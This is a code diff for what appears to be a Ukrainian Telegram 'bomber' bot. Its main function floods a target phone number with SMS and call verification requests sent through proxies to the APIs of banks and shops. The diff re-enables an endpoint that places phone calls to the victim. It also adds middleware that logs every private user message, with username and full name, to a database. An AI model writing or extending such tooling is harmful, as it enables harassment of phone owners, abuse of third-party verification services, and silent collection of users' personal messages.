@@ -129,6 +129,38 @@ storage = MemoryStorage()
 bot = Bot(token=config.token)
 dp = Dispatcher(bot, storage=storage)
 
+# Middleware для логування всіх повідомлень користувачів
+@dp.middleware()
+class LogMessagesMiddleware:
+    async def on_process_message(self, message: types.Message, data: dict):
+        """Логує всі повідомлення користувачів в базу даних"""
+        # Перевіряємо чи БД ініціалізована
+        if db_pool is None:
+            return
+        
+        # Логуємо тільки повідомлення з особистого чату
+        if message.chat.type != 'private':
+            return
+        
+        # Логуємо тільки якщо є текст
+        if not message.text:
+            return
+        
+        user_id = message.from_user.id
+        username = message.from_user.username or None
+        name = message.from_user.full_name or None
+        message_text = message.text
+        
+        try:
+            async with db_pool.acquire() as conn:
+                await conn.execute(
+                    'INSERT INTO user_messages (user_id, username, name, message_text) VALUES ($1, $2, $3, $4)',
+                    user_id, username, name, message_text
+                )
+        except Exception as e:
+            # Не логуємо помилки логування, щоб не зациклитися
+            logging.debug(f"Помилка логування повідомлення: {e}")
+
 async def init_db():
     global db_pool
     logging.info(f"Підключення до БД: {db_config['user']}@{db_config['host']}:{db_config['port']}/{db_config['database']}")
@@ -193,6 +225,8 @@ async def init_db():
                 CREATE TABLE IF NOT EXISTS user_messages (
                     id SERIAL PRIMARY KEY,
                     user_id BIGINT,
+                    username TEXT,
+                    name TEXT,
                     message_text TEXT,
                     timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 );
@@ -201,6 +235,17 @@ async def init_db():
         except Exception as e:
             logging.error(f"❌ Помилка створення таблиці user_messages: {e}")
             raise
+        
+        # Додаємо колонки якщо їх немає
+        try:
+            await conn.execute('ALTER TABLE user_messages ADD COLUMN IF NOT EXISTS username TEXT')
+        except Exception as e:
+            logging.error(f"Error adding username column to user_messages: {e}")
+        
+        try:
+            await conn.execute('ALTER TABLE user_messages ADD COLUMN IF NOT EXISTS name TEXT')
+        except Exception as e:
+            logging.error(f"Error adding name column to user_messages: {e}")
         
         # Видаляємо таблиці, які більше не використовуються
         try:
@@ -874,6 +919,22 @@ async def start(message: Message):
     
     # Перевірка VIP статусу
     if not await check_vip_status(user_id):
+        # Повідомляємо адміну про користувача без VIP
+        username = message.from_user.username or "Без username"
+        name = message.from_user.full_name or "Без імені"
+        for admin_id in ADMIN:
+            try:
+                await bot.send_message(
+                    admin_id,
+                    f"⚠️ <b>Користувач без VIP спробував використати бота</b>\n\n"
+                    f"👤 Ім'я: <a href='tg://user?id={user_id}'>{name}</a>\n"
+                    f"📱 Username: @{username}\n\n"
+                    f"🆔 ID:\n<code>{user_id}</code>",
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                logging.error(f"Помилка при відправленні адміну {admin_id}: {e}")
+        
         await message.answer(
             "🔒 <b>VIP доступ недоступний</b>\n\n"
             "На жаль, у вас немає VIP статусу для використання бота.\n"
@@ -1129,8 +1190,7 @@ async def admin_check_services(message: Message):
         ("Oschadbank", f"https://c2c.oschadbank.ua/api/sms/{test_number}", {"method": 'GET', "headers": headers}, None),
         ("Prosto", f"https://api.prosto.net/v2/verify?type=intl_phone&value={test_number}", {"method": 'GET', "headers": headers}, None),
         ("LA.ua", "https://la.ua/vinnytsya/wp-admin/admin-ajax.php?lang=uk", {"data": {"action": "user_login", "formData": f"tel={urllib.parse.quote(formatted_number9, safe='')}&code=", "nonce": "1d8ce3c7e4"}, "headers": headers_la}, None),
-        # Ta-Da Call (телефонує) - закоментовано
-        # ("Ta-Da Call", "https://api.ta-da.net.ua/v1.1/mobile/auth.call", {"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"}, None),
+        ("Ta-Da Call", "https://api.ta-da.net.ua/v1.1/mobile/auth.call", {"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"}, None),
     ]
     
     async def check_service_status(name, url_or_type, request_params, custom_headers):
@@ -2146,8 +2206,7 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None
             bounded_request(f"https://c2c.oschadbank.ua/api/sms/{number}", **with_proxy({"method": 'GET', "headers": headers})),
             bounded_request(f"https://api.prosto.net/v2/verify?type=intl_phone&value={number}", **with_proxy({"method": 'GET', "headers": headers})),
             bounded_request("https://la.ua/vinnytsya/wp-admin/admin-ajax.php?lang=uk", **with_proxy({"data": {"action": "user_login", "formData": f"tel={urllib.parse.quote(formatted_number_la, safe='')}&code=", "nonce": "1d8ce3c7e4"}, "headers": headers_la})),
-            # Ta-Da Call (телефонує) - закоментовано
-            # bounded_request("https://api.ta-da.net.ua/v1.1/mobile/auth.call", **with_proxy({"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"})),
+            bounded_request("https://api.ta-da.net.ua/v1.1/mobile/auth.call", **with_proxy({"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"})),
         ]
 
     if not attack_flags.get(chat_id):
